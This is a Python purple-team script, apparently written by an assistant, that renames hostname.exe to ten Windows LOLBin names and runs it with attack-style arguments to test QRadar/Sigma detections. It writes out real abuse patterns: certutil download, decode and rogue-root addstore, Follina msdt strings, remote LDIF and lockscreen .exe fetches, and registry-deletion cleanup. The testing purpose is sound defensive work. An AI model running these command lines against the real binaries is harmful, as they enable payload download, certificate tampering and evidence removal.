#!/usr/bin/env python3
r"""
LOLBin Masquerading Tester -- 10 New Binaries (Sigma-Sourced)
==============================================================
Scope (exactly these 10):
  Colorcpl.exe, Bash.exe, DataSvcUtil.exe, Certutil.exe, Ldifde.exe,
  Msdt.exe, Desktopimgdownldr.exe, Regini.exe, Makecab.exe, Gpscript.exe

NOTE ON "GSCRIPT.EXE":
  "Gscript.exe" is not a recognised Windows system binary or LOLBAS entry.
  No SigmaHQ rule exists for it. The closest Windows LOLBin by name with
  a verified Sigma rule is Gpscript.exe (Group Policy Script executor,
  proc_creation_win_lolbin_gpscript.yml). This script uses Gpscript.exe.
  If your QRadar rule genuinely targets a different binary called
  "Gscript.exe", share its exact conditions and I will update accordingly.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SIGMA SOURCES (all verified against SigmaHQ / detection.fyi):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Colorcpl.exe    file_event_win_susp_colorcpl.yml
  NOTE: the Sigma rule is a FILE EVENT rule (not process_creation) --
  it fires when colorcpl.exe creates a non-.icm/.gmmp/.cdmp/.camp file
  in C:\Windows\System32\spool\drivers\color\. The process_creation event
  is process name + file argument only. Your QRadar rule likely keys on
  the process name; we provide that plus a file-path argument.

Bash.exe        proc_creation_win_bash_command_execution.yml
                proc_creation_win_bash_file_execution.yml
  Sigma: Image|endswith '\bash.exe' OR OriginalFileName 'Bash.exe'
         AND CommandLine|contains ' -c '  (inline variant)
         OR  bash.exe <script_file>       (script-file variant)
  NOTE: the Sigma image condition requires the full System32 path. Our
  renamed hostname.exe in a temp folder satisfies Image|endswith '\bash.exe'
  for QRadar rules that check Image/ProcessName, but NOT OriginalFileName.

DataSvcUtil.exe proc_creation_win_lolbin_data_exfiltration_by_using_datasvcutil.yml
  Sigma: Image|endswith '\DataSvcUtil.exe' OR OriginalFileName 'DataSvcUtil.exe'
         AND CommandLine|contains '/in:' OR '/out:' OR '/uri:'

Certutil.exe    proc_creation_win_certutil_decode.yml
                proc_creation_win_certutil_download.yml
                proc_creation_win_certutil_certificate_installation.yml
  Sigma (decode):    CommandLine|contains '-decode ' or '-decodehex '
  Sigma (download):  CommandLine|contains '-urlcache' + '-split' + '-f'
  Sigma (addstore):  CommandLine|contains 'addstore'
  Multiple attacker techniques -- we try all three variants.

Ldifde.exe      proc_creation_win_ldifde_file_load.yml
  Sigma: Image|endswith '\ldifde.exe' OR OriginalFileName 'ldifde.exe'
         AND CommandLine|contains|all ['-i', '-f']

Msdt.exe        proc_creation_win_msdt_arbitrary_command_execution.yml
                proc_creation_win_msdt_susp_cab_options.yml
                proc_creation_win_msdt_susp_parent.yml
  Sigma: Image|endswith '\msdt.exe'
         AND CommandLine|contains 'IT_BrowseForFile=' (Follina/CVE-2022-30190)
         OR  CommandLine|contains ' PCWDiagnostic' + '/id' + '/skip'
         OR  CAB flag: CommandLine|contains '-cab'

Desktopimgdownldr.exe  proc_creation_win_desktopimgdownldr_susp_execution.yml
  Sigma: CommandLine|contains '/lockscreenurl:' AND NOT ends in .jpg/.jpeg/.png
         OR CommandLine|contains|all ['reg delete', '\PersonalizationCSP']

Regini.exe      proc_creation_win_regini_execution.yml  (low, name-only)
                proc_creation_win_regini_ads.yml         (high, ADS usage)
  Sigma (low):  Image|endswith '\regini.exe' (process name only)
  Sigma (high): Image|endswith '\regini.exe'
                AND CommandLine|re ':[^ \\]' (ADS stream reference)
  We include both variants.

Makecab.exe     No dedicated SigmaHQ process_creation rule found.
  LOLBAS: makecab.exe <source> <dest.cab> -- compress files for staging.
  Process name + .cab argument is the most likely QRadar detection vector.
  Share your exact rule text to tighten this.

Gpscript.exe    proc_creation_win_lolbin_gpscript.yml
  Sigma: Image|endswith '\gpscript.exe' OR OriginalFileName 'GPSCRIPT.EXE'
         AND CommandLine|contains ' /logon' OR ' /startup'
         NOT ParentCommandLine contains 'svchost.exe -k netsvcs -p -s gpsvc'

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SAFETY MODEL (unchanged throughout this series):
  Every process that executes is a hash-verified copy of hostname.exe,
  renamed on disk to the LOLBin filename. hostname.exe ignores all
  arguments and exits. The suspicious-looking argument strings are
  recorded in the 4688 event (at CreateProcess time, before the binary
  runs) -- that is exactly what QRadar/Sysmon reads. Nothing malicious
  ever executes. Cleanup is verified after every run. Stray folders
  from prior interrupted runs are swept at startup.

REQUIREMENTS: Windows only.
"""

import hashlib
import json
import os
import platform
import shutil
import subprocess
import sys
import tempfile
import time
from datetime import datetime
from pathlib import Path

KEEP_RESULTS_LOG = True
CANARY_TAG = f"PURPLE-TEAM-TEST-{datetime.now().strftime('%Y%m%d%H%M%S')}"
SAFE_SOURCE_BINARY = r"C:\Windows\System32\hostname.exe"
DROP_ARTIFACT_FILES = True

LOLBIN_TEST_CASES = {
    "Colorcpl.exe": {
        "sigma_rule": "file_event_win_susp_colorcpl.yml (FILE EVENT not proc_creation)",
        "sigma_condition": (
            "Sigma fires on file creation by colorcpl.exe -- not process_creation. "
            "Your QRadar rule likely matches process name + file argument."
        ),
        "artifact": "decoy_profile.icc",
        "args_variants": [
            # Colorcpl.exe copies the given file to the color profile directory.
            # We reference our inert placeholder so the CommandLine contains
            # a non-standard extension, matching the Sigma file-event intent.
            lambda wd: [str(wd / "decoy_profile.icc")],
        ],
    },
    "Bash.exe": {
        "sigma_rule": (
            "proc_creation_win_bash_command_execution.yml, "
            "proc_creation_win_bash_file_execution.yml"
        ),
        "sigma_condition": (
            "CommandLine|contains ' -c ' (inline) "
            "OR bash.exe <script_file> (script-file execution)"
        ),
        "artifact": "decoy_script.sh",
        "args_variants": [
            # Inline variant: bash.exe -c <command>
            lambda wd: ["-c", "echo decoy"],
            # Script-file variant: bash.exe scriptfile.sh
            lambda wd: [str(wd / "decoy_script.sh")],
        ],
    },
    "DataSvcUtil.exe": {
        "sigma_rule": "proc_creation_win_lolbin_data_exfiltration_by_using_datasvcutil.yml",
        "sigma_condition": "CommandLine|contains '/in:' OR '/out:' OR '/uri:'",
        "artifact": "decoy_output.cs",
        "args_variants": [
            # Exfil via /out: to a remote URI -- real attack fetches an OData endpoint
            lambda wd: ["/out:" + str(wd / "decoy_output.cs"),
                        "/uri:https://example.com/decoy/$metadata"],
            # Alternative /in: import variant
            lambda wd: ["/in:" + str(wd / "decoy_input.xml"),
                        "/out:" + str(wd / "decoy_output.cs")],
        ],
    },
    "Certutil.exe": {
        "sigma_rule": (
            "proc_creation_win_certutil_decode.yml, "
            "proc_creation_win_certutil_download.yml, "
            "proc_creation_win_certutil_certificate_installation.yml"
        ),
        "sigma_condition": (
            "CommandLine|contains '-decode '  (decode base64 payload) "
            "OR '-urlcache' + '-split' + '-f'  (download file) "
            "OR 'addstore'  (install rogue certificate)"
        ),
        "artifact": "decoy_encoded.b64",
        "args_variants": [
            # Decode: most commonly flagged certutil technique
            lambda wd: ["-decode",
                        str(wd / "decoy_encoded.b64"),
                        str(wd / "decoy_decoded.exe")],
            # Download: urlcache + split + -f
            lambda wd: ["-urlcache", "-split", "-f",
                        "https://example.com/decoy.exe",
                        str(wd / "decoy.exe")],
            # Encode (also detected, used to encode a payload for later use)
            lambda wd: ["-encode",
                        str(wd / "decoy_source.txt"),
                        str(wd / "decoy_encoded.b64")],
            # Certificate store manipulation
            lambda wd: ["addstore", "-f", "-enterprise",
                        "ROOT", str(wd / "decoy_cert.cer")],
        ],
    },
    "Ldifde.exe": {
        "sigma_rule": "proc_creation_win_ldifde_file_load.yml",
        "sigma_condition": "CommandLine|contains|all ['-i', '-f']",
        "artifact": "decoy_payload.ldf",
        "args_variants": [
            # Standard LDIF import -- real attack uses HTTP URI as -f target
            lambda wd: ["-i", "-f", str(wd / "decoy_payload.ldf")],
            # Attacker variant: fetch LDIF from remote server via HTTP
            lambda wd: ["-i", "-f", "https://example.com/decoy_payload.ldf",
                        "-s", "dc.example.com"],
        ],
    },
    "Msdt.exe": {
        "sigma_rule": (
            "proc_creation_win_msdt_arbitrary_command_execution.yml, "
            "proc_creation_win_msdt_susp_cab_options.yml"
        ),
        "sigma_condition": (
            "CommandLine|contains 'IT_BrowseForFile=' (Follina CVE-2022-30190) "
            "OR 'PCWDiagnostic' + '/id' + '/skip' "
            "OR '-cab' <diagcab_file>"
        ),
        "artifact": "decoy_answer.xml",
        "args_variants": [
            # Follina/CVE-2022-30190 pattern -- most well-known msdt abuse
            lambda wd: ["/id", "PCWDiagnostic", "/skip", "force",
                        "/param",
                        "IT_BrowseForFile=" + str(wd / "decoy_payload.exe")],
            # ms-msdt handler approach with PCWDiagnostic
            lambda wd: ["ms-msdt:-id", "PCWDiagnostic",
                        "IT_BrowseForFile=" + str(wd / "decoy_payload.exe")],
            # Cabinet (.cab/.diagcab) with embedded answer file
            lambda wd: ["-cab", str(wd / "decoy_diagcab.cab")],
        ],
    },
    "Desktopimgdownldr.exe": {
        "sigma_rule": "proc_creation_win_desktopimgdownldr_susp_execution.yml",
        "sigma_condition": (
            "CommandLine|contains '/lockscreenurl:' AND NOT .jpg/.jpeg/.png "
            "OR CommandLine|contains|all ['reg delete', '\\PersonalizationCSP']"
        ),
        "artifact": None,
        "args_variants": [
            # Primary technique: /lockscreenurl with non-image extension
            # (image extensions are filtered by the Sigma rule -- use .exe/.txt)
            lambda wd: ["/lockscreenurl:https://example.com/decoy.exe",
                        "/eventName:desktopimgdownldr"],
            # Registry cleanup pattern attackers use to avoid evidence
            lambda wd: ["reg", "delete",
                        r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion"
                        r"\PersonalizationCSP", "/f"],
        ],
    },
    "Regini.exe": {
        "sigma_rule": (
            "proc_creation_win_regini_execution.yml (low, name-only), "
            "proc_creation_win_regini_ads.yml (high, ADS stream reference)"
        ),
        "sigma_condition": (
            "Image|endswith '\\regini.exe' (name-only, low) "
            "OR CommandLine|re ':[^ \\]' -- references an ADS stream"
        ),
        "artifact": "decoy_reg_script.ini",
        "args_variants": [
            # Standard variant: regini.exe <script_file> (name-only rule)
            lambda wd: [str(wd / "decoy_reg_script.ini")],
            # ADS variant: regini.exe file.txt:streamname (high-severity rule)
            lambda wd: [str(wd / "decoy_reg_script.ini") + ":decoy_stream"],
        ],
    },
    "Makecab.exe": {
        "sigma_rule": "No dedicated SigmaHQ process_creation rule found",
        "sigma_condition": (
            "LOLBAS: makecab.exe <source> <dest.cab> -- compress files "
            "for staging/exfil. Process name + .cab argument is most likely "
            "QRadar detection. Share rule text to tighten."
        ),
        "artifact": "decoy_source.txt",
        "args_variants": [
            # Standard compression: makecab <source> <dest.cab>
            lambda wd: [str(wd / "decoy_source.txt"),
                        str(wd / "decoy_archive.cab")],
            # With explicit directive file
            lambda wd: ["/f", str(wd / "decoy_directive.ddf")],
        ],
    },
    "Gpscript.exe": {
        "sigma_rule": "proc_creation_win_lolbin_gpscript.yml",
        "sigma_condition": (
            "Image|endswith '\\gpscript.exe' OR OriginalFileName 'GPSCRIPT.EXE' "
            "AND CommandLine|contains ' /logon' OR ' /startup' "
            "NOT ParentCommandLine 'svchost.exe -k netsvcs -p -s gpsvc'"
        ),
        "artifact": None,
        "args_variants": [
            # Execute scripts assigned to logon Group Policy
            lambda wd: ["/logon"],
            # Execute scripts assigned to startup Group Policy
            lambda wd: ["/startup"],
        ],
    },
}


def sha256_of(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


def sweep_stray_runs():
    removed = []
    for p in Path(tempfile.gettempdir()).glob("lolbin10new_*"):
        if p.is_dir():
            shutil.rmtree(p, ignore_errors=True)
            if not p.exists():
                removed.append(str(p))
    return removed


def verified_cleanup(work_dir):
    shutil.rmtree(work_dir, ignore_errors=True)
    if not work_dir.exists():
        return True, []
    leftover = []
    for p in work_dir.rglob("*"):
        if p.is_file():
            try:
                p.unlink()
            except Exception:
                leftover.append(str(p))
    try:
        work_dir.rmdir()
    except Exception:
        pass
    return (not work_dir.exists()), leftover


def run_and_classify(cmd, timeout=15):
    """Use Popen not subprocess.run -- CompletedProcess has no .pid."""
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        pid = proc.pid
        try:
            proc.communicate(timeout=timeout)
            return f"exited on its own (rc={proc.returncode})", pid
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.communicate()
            return f"did not exit within {timeout}s -- killed", pid
    except OSError as e:
        if getattr(e, "winerror", None) == 5:
            return "BLOCKED (WinError 5 -- EDR/AV prevention fired)", None
        return f"launch error: {e}", None
    except Exception as e:
        return f"error: {e}", None


def casing_variants(name):
    seen, out = set(), []
    for v in [name.lower(), name, name.upper()]:
        if v not in seen:
            seen.add(v)
            out.append(v)
    return out


def main():
    if platform.system() != "Windows":
        print("Windows only -- exiting without doing anything.")
        sys.exit(1)

    if not Path(SAFE_SOURCE_BINARY).exists():
        print(f"Cannot find {SAFE_SOURCE_BINARY} -- aborting.")
        sys.exit(1)

    source_hash = sha256_of(SAFE_SOURCE_BINARY)

    stray = sweep_stray_runs()
    if stray:
        print(f"Swept {len(stray)} leftover folder(s) from previous run.\n")

    work_dir = Path(tempfile.mkdtemp(prefix="lolbin10new_"))
    print("=" * 78)
    print("LOLBin Tester -- 10 new binaries, Sigma-sourced, all casings")
    print("=" * 78)
    print(f"Canary tag     : {CANARY_TAG}")
    print(f"hostname SHA256: {source_hash}")
    print(f"Working dir    : {work_dir}")
    print(f"  (In \\AppData\\Local\\Temp\\ -- satisfies suspicious-path conditions)\n")

    log = []
    try:
        for canonical_name, cfg in LOLBIN_TEST_CASES.items():
            print(f"{'='*60}")
            print(f"[*] {canonical_name}")
            print(f"    Sigma rule  : {cfg['sigma_rule']}")
            print(f"    Sigma cond  : {cfg['sigma_condition']}")
            print()

            if DROP_ARTIFACT_FILES and cfg["artifact"]:
                (work_dir / cfg["artifact"]).write_text(
                    f"PURPLE TEAM TEST ARTIFACT - NOT EXECUTABLE\nCanary: {CANARY_TAG}\n"
                )

            blocked_globally = False
            for case_name in casing_variants(canonical_name):
                if blocked_globally:
                    break
                decoy_path = work_dir / case_name
                shutil.copy2(SAFE_SOURCE_BINARY, decoy_path)
                if sha256_of(decoy_path) != source_hash:
                    print(f"    [{case_name}] hash mismatch -- ABORTED")
                    continue

                for i, args_fn in enumerate(cfg["args_variants"], start=1):
                    cmd = [str(decoy_path)] + args_fn(work_dir)
                    print(f"    [{case_name}] v{i}: {' '.join(cmd)}")
                    ts = datetime.now().isoformat()
                    status, pid = run_and_classify(cmd)
                    print(f"         -> {status}  pid={pid}")
                    log.append({
                        "canonical_name": canonical_name,
                        "cased_as": case_name,
                        "variant": i,
                        "timestamp": ts,
                        "command": " ".join(cmd),
                        "status": status,
                        "pid": pid,
                    })
                    time.sleep(0.75)
                    if "BLOCKED" in status:
                        blocked_globally = True
                        print(f"    EDR blocked -- skipping remaining variants/casings")
                        break
            print()
    finally:
        cleaned, leftover = verified_cleanup(work_dir)

    print("=" * 78)
    print(f"CLEANUP: {work_dir} removed = {cleaned}")
    if not cleaned:
        for f in leftover:
            print(f"  STUCK: {f}")
    print("=" * 78 + "\n")

    if KEEP_RESULTS_LOG:
        results_file = Path.cwd() / f"lolbin10new_results_{CANARY_TAG}.json"
        with open(results_file, "w") as f:
            json.dump({"canary_tag": CANARY_TAG,
                       "hostname_sha256": source_hash,
                       "work_dir_cleaned": cleaned,
                       "results": log}, f, indent=2)
        print(f"Results saved: {results_file}")

    print(f"\nSearch QRadar for canary tag: {CANARY_TAG}")
    print("""
KEY THINGS TO WATCH FOR PER BINARY:

  Colorcpl.exe  -- The public Sigma rule is a file event, not process
                   creation. Your QRadar rule likely uses process name.
                   If it still doesn't fire, share the exact conditions.

  Bash.exe      -- Sigma requires the FULL System32 path in Image field.
                   Our temp-folder copy satisfies Image|endswith '\\bash.exe'
                   but NOT Image|startswith 'C:\\Windows\\System32'. If your
                   rule checks the full path, it won't fire here -- that's
                   by design for the real binary, and is useful diagnostic info.

  Certutil.exe  -- 4 documented attack variants are tried in sequence:
                   decode, urlcache-download, encode, addstore.
                   At least one should fire on almost any certutil rule.

  Msdt.exe      -- 3 CVE-2022-30190/Follina-era variants tried.
                   IT_BrowseForFile= is the classic Follina string.

  Desktopimgdownldr -- /lockscreenurl: variant avoids image extensions
                        (.jpg/.jpeg/.png) which the Sigma filter excludes.

  Regini.exe    -- Both name-only (low) and ADS-stream (high) variants.
                   The ADS variant (file:stream) is the high-severity trigger.

  Makecab.exe   -- No public Sigma process_creation rule found. If your
                   QRadar rule still doesn't fire, share its conditions.

  Gpscript.exe  -- /logon and /startup are the two documented abuse flags.
                   NOTE: if your rule is actually for a binary called
                   'Gscript.exe' (not Gpscript.exe), share the rule text.
""")


if __name__ == "__main__":
    main()
